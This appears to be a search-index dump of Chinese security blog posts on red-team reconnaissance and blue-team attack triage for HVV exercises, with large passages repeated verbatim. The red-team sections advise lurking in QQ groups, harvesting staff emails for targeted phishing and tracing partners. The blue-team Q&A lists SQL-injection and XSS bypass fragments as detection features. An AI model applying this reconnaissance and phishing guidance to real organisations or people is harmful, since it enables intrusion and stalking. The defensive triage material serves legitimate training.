项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#脉讯互联网传播管理平台"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#瞬速互联网舆情监测系统免费"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#瞬速网络信息采集系统免费"},{"categories":["hvv"],"content":"\r0x20 搜索引擎收集的所有资产如上标题里说的资产，不是普通定义中的资产，而是信息收集里面的企业信息资产。 ICMP存活探测–\u003e端口开放探测–\u003e端口指纹服务识别–\u003e提取快照(若为WEB)–\u003e搜索网页敏感内容(邮箱、手机号、URL)–\u003e生成结果报表 此处为什么会这么讲呢？ 因为，随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着“隐形资产”，这些“隐形资产”通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。 在渗透测试中，我们需要尽可能多的去收集目标的信息，资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信 息，这对我们进一步的渗透测试显得尤为重要。 APP、媒体公众号等收集 通过百家号、微博、抖音、快手、哔哩哔哩等媒体公众号，可以收集到员工的账号。或是不小心泄露出来的一些web服务。当收集到qq群这种信息时还可以”潜伏”到qq群，qq群文件可能会包含一些敏感的信息。这方面的信息收集能够帮助我们在漏洞利用时构造一些参数值或是进行暴力破解等等。 随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。 通过对APP流量的抓取也可以获取到部分子域名或者ip。 http://www.zyzilxy.top:1220/?p=5328 行业系统 同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比 通用：办公OA、邮件系统、VPN等 医院：门户、预约系统、掌上医院、微信公众平台等 而关于信息收集，主要就是在资产收集之后，针对单个站点的信息进行收集，主要围绕服务器ip，域名，网站等. 对于更高阶的安全从业人员来说，可以结合威胁情报，对红队人员进行针对性溯源。 对于企业的运维人员来说，可以结合流量日志，对IP信誉进行碰撞，发现隐藏的攻击IP。 对于红队人员来说，可以结合威胁情报搜索攻击资产，从而不必使用目录爆破方式进行批量的爆破，费时费力（有的子目录的名字不好猜，通过爆破目录工具也拿不到）。 有时主站实在弄不动，其实也可以去收集情报，意思就是说：收集主站官网上发布的相关情报信息进行汇总，说不定会有额外的发现。 **例如：**某Ax集团从2017年开始改名为某AX1集团。但我们分配下来的目标时拿到的目标单位名称是某AX1集团，那么我们猜测，去信息收集相关的某Ax集团资产信息（有些忘记改网站名称，甚至有可能一直使用之前该名称之前的单位名称），我们也可以拿到足够多的情报后，制作针对性的钓鱼邮件，网上收集相关的目标单位的在职人员的邮箱，进行钓鱼 对于女生来说，可以使用情报对男朋友进行溯源。 参考链接：https://mp.weixin.qq.com/s/VJCPAluqz8YDyCxE8HZtdQ https://mp.weixin.qq.com/s/SwnFnn9kB-_3fSLvFS5bVQ https://mp.weixin.qq.com/s/hZ47n0SgycWxf2lWoRp1ZQ https://mp.weixin.qq.com/s/4SIxsPoIICxHxZYs64I5vw https://mp.weixin.qq.com/s/QDarNtl9yPjGl8u2QQ2QRA ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:20","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x20-搜索引擎收集的所有资产"},{"categories":["hvv"],"content":"\r0x20 搜索引擎收集的所有资产如上标题里说的资产，不是普通定义中的资产，而是信息收集里面的企业信息资产。 ICMP存活探测–\u003e端口开放探测–\u003e端口指纹服务识别–\u003e提取快照(若为WEB)–\u003e搜索网页敏感内容(邮箱、手机号、URL)–\u003e生成结果报表 此处为什么会这么讲呢？ 因为，随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着“隐形资产”，这些“隐形资产”通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。 在渗透测试中，我们需要尽可能多的去收集目标的信息，资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信 息，这对我们进一步的渗透测试显得尤为重要。 APP、媒体公众号等收集 通过百家号、微博、抖音、快手、哔哩哔哩等媒体公众号，可以收集到员工的账号。或是不小心泄露出来的一些web服务。当收集到qq群这种信息时还可以”潜伏”到qq群，qq群文件可能会包含一些敏感的信息。这方面的信息收集能够帮助我们在漏洞利用时构造一些参数值或是进行暴力破解等等。 随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。 通过对APP流量的抓取也可以获取到部分子域名或者ip。 http://www.zyzilxy.top:1220/?p=5328 行业系统 同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比 通用：办公OA、邮件系统、VPN等 医院：门户、预约系统、掌上医院、微信公众平台等 而关于信息收集，主要就是在资产收集之后，针对单个站点的信息进行收集，主要围绕服务器ip，域名，网站等. 对于更高阶的安全从业人员来说，可以结合威胁情报，对红队人员进行针对性溯源。 对于企业的运维人员来说，可以结合流量日志，对IP信誉进行碰撞，发现隐藏的攻击IP。 对于红队人员来说，可以结合威胁情报搜索攻击资产，从而不必使用目录爆破方式进行批量的爆破，费时费力（有的子目录的名字不好猜，通过爆破目录工具也拿不到）。 有时主站实在弄不动，其实也可以去收集情报，意思就是说：收集主站官网上发布的相关情报信息进行汇总，说不定会有额外的发现。 **例如：**某Ax集团从2017年开始改名为某AX1集团。但我们分配下来的目标时拿到的目标单位名称是某AX1集团，那么我们猜测，去信息收集相关的某Ax集团资产信息（有些忘记改网站名称，甚至有可能一直使用之前该名称之前的单位名称），我们也可以拿到足够多的情报后，制作针对性的钓鱼邮件，网上收集相关的目标单位的在职人员的邮箱，进行钓鱼 对于女生来说，可以使用情报对男朋友进行溯源。 参考链接：https://mp.weixin.qq.com/s/VJCPAluqz8YDyCxE8HZtdQ https://mp.weixin.qq.com/s/SwnFnn9kB-_3fSLvFS5bVQ https://mp.weixin.qq.com/s/hZ47n0SgycWxf2lWoRp1ZQ https://mp.weixin.qq.com/s/4SIxsPoIICxHxZYs64I5vw https://mp.weixin.qq.com/s/QDarNtl9yPjGl8u2QQ2QRA ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:20","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#参考链接"},{"categories":["hvv"],"content":"HVV专题–蓝队溯源反制 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:0:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；\u003cimg/src=1\u003e；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#攻击研判"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#1怎么确定是真实攻击还是误报"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#2cdn如何绕过"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 